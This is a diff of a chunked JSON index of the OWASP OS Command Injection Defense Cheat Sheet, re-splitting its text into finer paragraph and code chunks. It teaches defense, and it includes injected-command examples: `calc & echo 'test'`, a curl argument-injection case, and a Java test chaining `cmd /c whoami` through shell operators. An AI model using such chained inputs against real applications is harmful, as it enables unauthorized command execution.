@@ -35,9 +35,9 @@
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
       "chunk_idx": 2,
-      "chunk_type": "mixed",
-      "text_content": "Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.\n\nFor example, if the supplied value is:\n\n``` shell\ncalc\n```\n\nwhen typed in a Windows command prompt, the application *Calculator* is displayed.\n\nHowever, if the supplied value has been tampered with, and now it is:\n\n``` shell\ncalc & echo \"test\"\n```\n\nwhen executed, it changes the meaning of the initial intended value.\n\nNow, both the *Calculator* application and the value *test* are displayed:\n\n![CommandInjection](../assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)\n\nThe problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.",
-      "token_count": 182,
+      "chunk_type": "paragraph",
+      "text_content": "Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.\n\nFor example, if the supplied value is:",
+      "token_count": 50,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "OS Command Injection Defense Cheat Sheet",
@@ -49,6 +49,62 @@
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
       "chunk_idx": 3,
+      "chunk_type": "code",
+      "text_content": "``` shell\ncalc\n```",
+      "token_count": 8,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00004",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 4,
+      "chunk_type": "paragraph",
+      "text_content": "when typed in a Windows command prompt, the application *Calculator* is displayed.\n\nHowever, if the supplied value has been tampered with, and now it is:",
+      "token_count": 32,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00005",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 5,
+      "chunk_type": "code",
+      "text_content": "``` shell\ncalc & echo \"test\"\n```",
+      "token_count": 13,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00006",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 6,
+      "chunk_type": "paragraph",
+      "text_content": "when executed, it changes the meaning of the initial intended value.\n\nNow, both the *Calculator* application and the value *test* are displayed:\n\n![CommandInjection](../assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)\n\nThe problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.",
+      "token_count": 79,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00007",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 7,
       "chunk_type": "heading",
       "text_content": "### Argument Injection",
       "token_count": 5,
@@ -60,13 +116,13 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_id": "ver_b497005071ae_c00008",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 4,
-      "chunk_type": "mixed",
-      "text_content": "Every OS Command Injection is also an Argument Injection.\n\nIn this type of attacks, user input can be passed as arguments while executing a specific command.\n\nFor example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.\n\n```php\n\nsystem(\"curl \" .\n\nescape($url));\n```\n\nwhich will prevent an attacker to run other commands.\n\nHowever, if the attacker controlled string contains an additional argument of the `curl` command:\n\n```php\n\nsystem(\"curl \" .\n\nescape(\"--help\"))\n```\n\nNow when the above code is executed, it will show the output of `curl --help`.\n\nDepending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.",
-      "token_count": 185,
+      "chunk_idx": 8,
+      "chunk_type": "paragraph",
+      "text_content": "Every OS Command Injection is also an Argument Injection.\n\nIn this type of attacks, user input can be passed as arguments while executing a specific command.\n\nFor example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.",
+      "token_count": 61,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "OS Command Injection Defense Cheat Sheet",
@@ -75,10 +131,70 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00005",
+      "chunk_id": "ver_b497005071ae_c00009",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 5,
+      "chunk_idx": 9,
+      "chunk_type": "code",
+      "text_content": "```php\n\nsystem(\"curl \" . escape($url));\n```",
+      "token_count": 20,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction",
+        "Argument Injection"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00010",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 10,
+      "chunk_type": "paragraph",
+      "text_content": "which will prevent an attacker to run other commands.\n\nHowever, if the attacker controlled string contains an additional argument of the `curl` command:",
+      "token_count": 28,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction",
+        "Argument Injection"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00011",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 11,
+      "chunk_type": "code",
+      "text_content": "```php\n\nsystem(\"curl \" . escape(\"--help\"))\n```",
+      "token_count": 22,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction",
+        "Argument Injection"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00012",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 12,
+      "chunk_type": "paragraph",
+      "text_content": "Now when the above code is executed, it will show the output of `curl --help`.\n\nDepending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.",
+      "token_count": 54,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Introduction",
+        "Argument Injection"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00013",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 13,
       "chunk_type": "heading",
       "text_content": "## Primary Defenses",
       "token_count": 4,
@@ -89,10 +205,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00006",
+      "chunk_id": "ver_b497005071ae_c00014",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 6,
+      "chunk_idx": 14,
       "chunk_type": "heading",
       "text_content": "### Defense Option 1: Avoid calling OS commands directly",
       "token_count": 12,
@@ -104,10 +220,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00007",
+      "chunk_id": "ver_b497005071ae_c00015",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 7,
+      "chunk_idx": 15,
       "chunk_type": "paragraph",
       "text_content": "The primary defense is to avoid calling OS commands directly.\n\nBuilt-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.\n\nFor example use `mkdir()` instead of `system(\"mkdir /dir_name\")`.\n\nIf there are available libraries or APIs for the language you use, this is the preferred method.",
       "token_count": 82,
@@ -119,10 +235,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00008",
+      "chunk_id": "ver_b497005071ae_c00016",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 8,
+      "chunk_idx": 16,
       "chunk_type": "heading",
       "text_content": "### Defense option 2: Escape values added to OS commands specific to each OS",
       "token_count": 17,
@@ -134,10 +250,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00009",
+      "chunk_id": "ver_b497005071ae_c00017",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 9,
+      "chunk_idx": 17,
       "chunk_type": "paragraph",
       "text_content": "For examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.\n\nThe `escapeshellarg()` surrounds the user input in single quotes, so if the malformed user input is something like `& echo \"hello\"`, the final output will be like `calc '& echo \"hello\"'` which will be parsed as a single argument to the command `calc`.\n\nEven though `escapeshellarg()` prevents OS Command Injection, an attacker can still pass a single argument to the command.",
       "token_count": 119,
@@ -149,10 +265,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00010",
+      "chunk_id": "ver_b497005071ae_c00018",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 10,
+      "chunk_idx": 18,
       "chunk_type": "heading",
       "text_content": "### Defense option 3: Parameterization in conjunction with Input Validation",
       "token_count": 13,
@@ -164,10 +280,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00011",
+      "chunk_id": "ver_b497005071ae_c00019",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 11,
+      "chunk_idx": 19,
       "chunk_type": "paragraph",
       "text_content": "If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:",
       "token_count": 29,
@@ -179,10 +295,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00012",
+      "chunk_id": "ver_b497005071ae_c00020",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 12,
+      "chunk_idx": 20,
       "chunk_type": "heading",
       "text_content": "#### Layer 1",
       "token_count": 6,
@@ -195,10 +311,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00013",
+      "chunk_id": "ver_b497005071ae_c00021",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 13,
+      "chunk_idx": 21,
       "chunk_type": "paragraph",
       "text_content": "**Parameterization:** If available, use structured mechanisms that automatically enforce the separation between data and command.\n\nThese mechanisms can help provide the relevant quoting and encoding.",
       "token_count": 33,
@@ -211,10 +327,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00014",
+      "chunk_id": "ver_b497005071ae_c00022",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 14,
+      "chunk_idx": 22,
       "chunk_type": "heading",
       "text_content": "#### Layer 2",
       "token_count": 6,
@@ -227,13 +343,13 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_id": "ver_b497005071ae_c00023",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 15,
+      "chunk_idx": 23,
       "chunk_type": "mixed",
-      "text_content": "**Input validation:** The values for commands and the relevant arguments should be both validated.\n\nThere are different degrees of validation for the actual command and its arguments:\n\n- When it comes to the **commands** used, these must be validated against a list of allowed commands.\n\n- In regards to the **arguments** used for these commands, they should be validated using the following options:\n    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.\n\n- **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined.\n\nEnsure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression.\n\nFor example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters.\n\nThe length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`\n- For commands that support it, use `--` to end option parsing.\n\nIn [curl](https://curl.se/docs/manpage.html#OPTIONS), later arguments are still URL operands: `--` does not prevent additional transfers.\n\nPass exactly one validated URL as one argument using a process API, and disable curl's [URL globbing](https://curl.se/docs/manpage.html#GLOBBING) with `--globoff`.\n\nDo not interpolate an unquoted value into a shell command.\n\nArgument separation does not validate the destination; apply [SSRF protections](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md).\n\n**Note A:**\n\n```text\n& |  ; $ > < ` \\ !\n\n' \" ( )\n```",
-      "token_count": 355,
+      "text_content": "**Input validation:** The values for commands and the relevant arguments should be both validated.\n\nThere are different degrees of validation for the actual command and its arguments:\n\n- When it comes to the **commands** used, these must be validated against a list of allowed commands.\n\n- In regards to the **arguments** used for these commands, they should be validated using the following options:\n    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.\n\n- **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined.\n\nEnsure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression.\n\nFor example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters.\n\nThe length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`\n- For commands that support it, use `--` to end option parsing.\n\nIn [curl](https://curl.se/docs/manpage.html#OPTIONS), later arguments are still URL operands: `--` does not prevent additional transfers.\n\nPass exactly one validated URL as one argument using a process API, and disable curl's [URL globbing](https://curl.se/docs/manpage.html#GLOBBING) with `--globoff`.\n\nDo not interpolate an unquoted value into a shell command.\n\nArgument separation does not validate the destination; apply [SSRF protections](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md).\n\n**Note A:**",
+      "token_count": 335,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "OS Command Injection Defense Cheat Sheet",
@@ -243,10 +359,26 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00016",
+      "chunk_id": "ver_b497005071ae_c00024",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 16,
+      "chunk_idx": 24,
+      "chunk_type": "code",
+      "text_content": "```text\n& |  ; $ > < ` \\ ! ' \" ( )\n```",
+      "token_count": 20,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Primary Defenses",
+        "Defense option 3: Parameterization in conjunction with Input Validation",
+        "Layer 2"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00025",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 25,
       "chunk_type": "heading",
       "text_content": "## Additional Defenses",
       "token_count": 4,
@@ -257,10 +389,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00017",
+      "chunk_id": "ver_b497005071ae_c00026",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 17,
+      "chunk_idx": 26,
       "chunk_type": "mixed",
       "text_content": "On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.\n\nThese additional defenses are:\n\n- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.\n\n- If possible, create isolated accounts with limited privileges that are only used for a single task.",
       "token_count": 68,
@@ -271,10 +403,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00018",
+      "chunk_id": "ver_b497005071ae_c00027",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 18,
+      "chunk_idx": 27,
       "chunk_type": "heading",
       "text_content": "## Code examples",
       "token_count": 4,
@@ -285,10 +417,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00019",
+      "chunk_id": "ver_b497005071ae_c00028",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 19,
+      "chunk_idx": 28,
       "chunk_type": "heading",
       "text_content": "### Java",
       "token_count": 4,
@@ -300,10 +432,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_id": "ver_b497005071ae_c00029",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 20,
+      "chunk_idx": 29,
       "chunk_type": "paragraph",
       "text_content": "In Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.\n\n`Runtime.exec(String)` is [deprecated since Java 18](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Runtime.html) as error-prone: it splits the command String into tokens on whitespace only, so an argument that contains a space is broken into several tokens, which is how untrusted input can add extra arguments (see [Argument Injection](#argument-injection)).\n\nUse `ProcessBuilder` or `Runtime.exec(String[])` instead, passing the program and each argument as separate elements.\n\nSeparating the arguments does not replace validating them.\n\n*Note about the behavior of Java's `Runtime.exec(String)` method:*\n\nThere are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function.\n\nThis is not true.\n\nBoth allow you to invoke a new program/process.\n\nHowever, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec(String)` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.\n\n**`Runtime.exec(String)` does NOT try to invoke the shell at any point and does not support shell metacharacters**.\n\nThe key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using `&`, `&&`, `|`, `||`, etc, redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.\n\n*Code to test the note above:*",
       "token_count": 426,
@@ -315,13 +447,13 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00021",
+      "chunk_id": "ver_b497005071ae_c00030",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 21,
-      "chunk_type": "mixed",
-      "text_content": "``` java\nString[] specialChars = new String[]{\"&\", \"&&\", \"|\", \"||\"};\nString payload = \"cmd /c whoami\";\nString cmdTemplate = \"java -version %s \" + payload;\nString cmd;\nProcess p;\nint returnCode;\nfor (String specialChar : specialChars) {\n    cmd = String.format(cmdTemplate, specialChar);\n    System.out.printf(\"#### TEST CMD: %s\\n\", cmd);\n    p = Runtime.getRuntime().exec(cmd);\n    returnCode = p.waitFor();\n    System.out.printf(\"RC    : %s\\n\", returnCode);\n    System.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                      \"utf-8\"));\n    System.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                      \"utf-8\"));\n}\nSystem.out.printf(\"#### TEST PAYLOAD ONLY: %s\\n\", payload);\np = Runtime.getRuntime().exec(payload);\nreturnCode = p.waitFor();\nSystem.out.printf(\"RC    : %s\\n\", returnCode);\nSystem.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                  \"utf-8\"));\nSystem.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                  \"utf-8\"));\n```\n\n*Result of the test:*\n\n```text\n##### TEST CMD: java -version & cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version && cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version | cmd /c whoami\nRC    : 0\nOUT   :",
-      "token_count": 450,
+      "chunk_idx": 30,
+      "chunk_type": "code",
+      "text_content": "``` java\nString[] specialChars = new String[]{\"&\", \"&&\", \"|\", \"||\"};\nString payload = \"cmd /c whoami\";\nString cmdTemplate = \"java -version %s \" + payload;\nString cmd;\nProcess p;\nint returnCode;\nfor (String specialChar : specialChars) {\n    cmd = String.format(cmdTemplate, specialChar);\n    System.out.printf(\"#### TEST CMD: %s\\n\", cmd);\n    p = Runtime.getRuntime().exec(cmd);\n    returnCode = p.waitFor();\n    System.out.printf(\"RC    : %s\\n\", returnCode);\n    System.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                      \"utf-8\"));\n    System.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                      \"utf-8\"));\n}\nSystem.out.printf(\"#### TEST PAYLOAD ONLY: %s\\n\", payload);\np = Runtime.getRuntime().exec(payload);\nreturnCode = p.waitFor();\nSystem.out.printf(\"RC    : %s\\n\", returnCode);\nSystem.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                  \"utf-8\"));\nSystem.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                  \"utf-8\"));\n```",
+      "token_count": 353,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "OS Command Injection Defense Cheat Sheet",
@@ -330,13 +462,13 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00022",
+      "chunk_id": "ver_b497005071ae_c00031",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 22,
-      "chunk_type": "mixed",
-      "text_content": "ERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version || cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST PAYLOAD ONLY: cmd /c whoami\nRC    : 0\nOUT   :\nmydomain\\simpleuser\n\nERROR :\n```\n\n*Incorrect usage:*\n\n```java\nProcessBuilder b = new ProcessBuilder(\"C:\\\\DoStuff.exe -arg1 -arg2\");\n```\n\nThis creates a builder with one command-list element, not a program followed by two arguments.\n\n[`ProcessBuilder`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html) represents the executable and its arguments as a list.\n\nThe snippet does not start a process or demonstrate shell-command injection.\n\n*Correct Usage:*\n\nThis illustrative example starts a process with a modified working directory and passes the executable and each argument separately.\n\nKeep the executable and working directory trusted, and validate any untrusted arguments for the invoked program.\n\nArgument separation does not replace [argument validation](#layer-2).\n\n``` java\nProcessBuilder pb = new ProcessBuilder(\"TrustedCmd\", \"TrustedArg1\", \"TrustedArg2\");\n\nMap<String, String> env = pb.environment();\n\npb.directory(new File(\"TrustedDir\"));\n\nProcess p = pb.start();\n```",
-      "token_count": 307,
+      "chunk_idx": 31,
+      "chunk_type": "paragraph",
+      "text_content": "*Result of the test:*",
+      "token_count": 7,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "OS Command Injection Defense Cheat Sheet",
@@ -345,10 +477,85 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00023",
+      "chunk_id": "ver_b497005071ae_c00032",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 23,
+      "chunk_idx": 32,
+      "chunk_type": "code",
+      "text_content": "```text\n##### TEST CMD: java -version & cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version && cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version | cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version || cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST PAYLOAD ONLY: cmd /c whoami\nRC    : 0\nOUT   :\nmydomain\\simpleuser\n\nERROR :\n```",
+      "token_count": 160,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "Java"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00033",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 33,
+      "chunk_type": "paragraph",
+      "text_content": "*Incorrect usage:*",
+      "token_count": 5,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "Java"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00034",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 34,
+      "chunk_type": "code",
+      "text_content": "```java\nProcessBuilder b = new ProcessBuilder(\"C:\\\\DoStuff.exe -arg1 -arg2\");\n```",
+      "token_count": 28,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "Java"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00035",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 35,
+      "chunk_type": "paragraph",
+      "text_content": "This creates a builder with one command-list element, not a program followed by two arguments.\n\n[`ProcessBuilder`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html) represents the executable and its arguments as a list.\n\nThe snippet does not start a process or demonstrate shell-command injection.\n\n*Correct Usage:*\n\nThis illustrative example starts a process with a modified working directory and passes the executable and each argument separately.\n\nKeep the executable and working directory trusted, and validate any untrusted arguments for the invoked program.\n\nArgument separation does not replace [argument validation](#layer-2).",
+      "token_count": 142,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "Java"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00036",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 36,
+      "chunk_type": "code",
+      "text_content": "``` java\nProcessBuilder pb = new ProcessBuilder(\"TrustedCmd\", \"TrustedArg1\", \"TrustedArg2\");\n\nMap<String, String> env = pb.environment();\n\npb.directory(new File(\"TrustedDir\"));\n\nProcess p = pb.start();\n```",
+      "token_count": 62,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "Java"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00037",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 37,
       "chunk_type": "heading",
       "text_content": "### .NET",
       "token_count": 5,
@@ -360,10 +567,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00024",
+      "chunk_id": "ver_b497005071ae_c00038",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 24,
+      "chunk_idx": 38,
       "chunk_type": "list",
       "text_content": "- If starting a process is necessary, use a fixed, fully qualified executable path in `FileName` and set [`UseShellExecute = false`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute#remarks).\n\nThis starts the executable directly; it does not validate its arguments.\n\n- On modern .NET, add each argument separately with [`ProcessStartInfo.ArgumentList`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist#remarks).\n\nIt handles escaping, but untrusted input remains a security risk.\n\nValidate each value against the called program's allowed options and operands, such as permitted paths or destinations.\n\n- Do not pass untrusted input to command interpreters such as `cmd.exe`, `powershell.exe`, or `sh -c`.\n\n- .NET Framework has no `ArgumentList`.\n\nAvoid constructing `Arguments` from untrusted input; if necessary, restrict values to a command-specific allowlist that needs no quoting.\n\n[`Arguments` parsing](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.arguments#remarks) depends on the target program and platform.",
       "token_count": 261,
@@ -375,10 +582,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00025",
+      "chunk_id": "ver_b497005071ae_c00039",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 25,
+      "chunk_idx": 39,
       "chunk_type": "heading",
       "text_content": "### PHP",
       "token_count": 4,
@@ -390,13 +597,133 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00026",
+      "chunk_id": "ver_b497005071ae_c00040",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 26,
+      "chunk_idx": 40,
+      "chunk_type": "paragraph",
